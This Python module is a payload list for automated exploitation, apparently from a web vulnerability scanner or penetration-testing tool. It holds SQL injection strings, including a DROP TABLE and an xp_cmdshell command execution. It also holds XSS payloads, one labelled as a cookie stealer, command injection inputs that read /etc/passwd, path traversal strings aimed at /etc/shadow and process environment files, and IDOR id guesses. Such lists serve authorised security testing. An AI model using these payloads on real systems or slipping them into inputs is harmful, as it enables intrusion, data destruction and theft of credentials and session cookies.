"""
Payload database for automated exploitation
"""

SQL_INJECTION_PAYLOADS = [
    # Classic SQL Injection
    {"payload": "' OR '1'='1", "description": "Basic OR injection"},
    {"payload": "' OR 1=1 --", "description": "OR injection with comment"},
    {"payload": "' UNION SELECT NULL--", "description": "UNION injection"},
    {"payload": "' UNION SELECT NULL,NULL--", "description": "UNION injection (2 columns)"},
    {"payload": "' UNION SELECT NULL,NULL,NULL--", "description": "UNION injection (3 columns)"},
    {"payload": "' AND 1=1 --", "description": "AND injection (true)"},
    {"payload": "' AND 1=2 --", "description": "AND injection (false)"},
    {"payload": "' OR 'x'='x", "description": "OR injection with string"},
    {"payload": "' OR 'x'='x' --", "description": "OR injection with comment"},
    {"payload": "' OR '1'='1' ;--", "description": "OR injection with semicolon"},
    {"payload": "'; DROP TABLE users--", "description": "DROP table injection"},
    {"payload": "' OR 1=1; EXEC xp_cmdshell('dir')--", "description": "Command execution (MSSQL)"},
    {"payload": "' OR 1=1; SELECT * FROM information_schema.tables--", "description": "Information schema dump"},
    # Time-based
    {"payload": "' AND SLEEP(5)--", "description": "Time-based (MySQL)"},
    {"payload": "' WAITFOR DELAY '0:0:5'--", "description": "Time-based (MSSQL)"},
    {"payload": "' AND pg_sleep(5)--", "description": "Time-based (PostgreSQL)"},
    # Error-based
    {"payload": "' AND 1=CONVERT(int, @@version)--", "description": "Error-based version disclosure"},
    {"payload": "' AND 1=CAST(@@VERSION AS int)--", "description": "Error-based version disclosure (MSSQL)"},
]

XSS_PAYLOADS = [
    {"payload": "<script>alert('XSS')</script>", "description": "Basic XSS"},
    {"payload": "<script>alert(document.cookie)</script>", "description": "Cookie stealer"},
    {"payload": "<img src=x onerror=alert('XSS')>", "description": "Image onerror XSS"},
    {"payload": "<body onload=alert('XSS')>", "description": "Body onload XSS"},
    {"payload": "<input type=text onfocus=alert('XSS')>", "description": "Input onfocus XSS"},
    {"payload": "javascript:alert('XSS')", "description": "JavaScript protocol XSS"},
    {"payload": "<svg onload=alert('XSS')>", "description": "SVG onload XSS"},
    {"payload": "'><script>alert('XSS')</script>", "description": "Breakout XSS"},
    {"payload": "\"><script>alert('XSS')</script>", "description": "Double quote breakout XSS"},
    {"payload": "<iframe src=javascript:alert('XSS')>", "description": "iframe XSS"},
]

COMMAND_INJECTION_PAYLOADS = [
    {"payload": "; ls -la", "description": "List directory (Linux)"},
    {"payload": "& dir", "description": "List directory (Windows)"},
    {"payload": "| whoami", "description": "Whoami command"},
    {"payload": "|| whoami", "description": "Whoami with OR"},
    {"payload": "&& whoami", "description": "Whoami with AND"},
    {"payload": "; cat /etc/passwd", "description": "Read passwd file"},
    {"payload": "& type C:\\Windows\\win.ini", "description": "Read Windows file"},
    {"payload": "| id", "description": "Show user ID"},
    {"payload": "; ping -c 1 google.com", "description": "Ping test"},
]

PATH_TRAVERSAL_PAYLOADS = [
    {"payload": "../../../etc/passwd", "description": "Basic traversal"},
    {"payload": "..\\..\\..\\Windows\\win.ini", "description": "Windows traversal"},
    {"payload": "../../../../etc/passwd", "description": "Deep traversal"},
    {"payload": "/etc/passwd", "description": "Absolute path"},
    {"payload": "/proc/self/environ", "description": "Environment variables"},
    {"payload": "../../../etc/shadow", "description": "Shadow file"},
    {"payload": "....//....//....//etc/passwd", "description": "Double dot bypass"},
]

IDOR_PAYLOADS = [
    {"payload": "1", "description": "Access ID 1"},
    {"payload": "admin", "description": "Admin access"},
    {"payload": "0", "description": "Access ID 0"},
    {"payload": "-1", "description": "Access ID -1"},
    {"payload": "999999", "description": "Large ID"},
]

ALL_PAYLOADS = {
    'sql_injection': SQL_INJECTION_PAYLOADS,
    'xss': XSS_PAYLOADS,
    'command_injection': COMMAND_INJECTION_PAYLOADS,
    'path_traversal': PATH_TRAVERSAL_PAYLOADS,
    'idor': IDOR_PAYLOADS,
}